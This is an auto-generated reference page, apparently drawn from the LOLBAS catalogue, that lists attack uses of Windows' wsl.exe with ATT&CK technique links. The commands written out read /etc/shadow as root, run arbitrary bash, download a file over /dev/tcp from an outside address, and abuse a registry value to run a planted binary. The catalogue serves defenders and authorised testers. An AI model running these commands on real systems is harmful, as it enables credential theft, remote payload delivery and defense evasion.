---
parsed_by: focuslocust
source: commands
type: generated
---
# Wsl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Wsl.exe

Tool page: [Wsl.exe](../../tools/windows/wsl.exe.md)

### Performs execution of specified file, can be used to execute arbitrary Linux commands.

```text
wsl.exe -e /mnt/c/Windows/System32/calc.exe
```

Description:

Executes calc.exe from wsl.exe

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Wsl.yml` |
| Evidence | Command preserved from source parser. |

### Performs execution of arbitrary Linux commands as root without need for password.

```text
wsl.exe -u root -e cat /etc/shadow
```

Description:

Cats /etc/shadow file as root

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Wsl.yml` |
| Evidence | Command preserved from source parser. |

### Performs execution of arbitrary Linux commands.

```text
wsl.exe --exec bash -c "{CMD}"
```

Description:

Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Wsl.yml` |
| Evidence | Command preserved from source parser. |

### Download file

```text
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
```

Description:

Downloads file from 192.168.1.10

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Wsl.yml` |
| Evidence | Command preserved from source parser. |

### Execute a payload as a child process of `bash.exe` while masquerading as WSL.

```text
wsl.exe
```

Description:

When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Wsl.yml` |
| Evidence | Command preserved from source parser. |
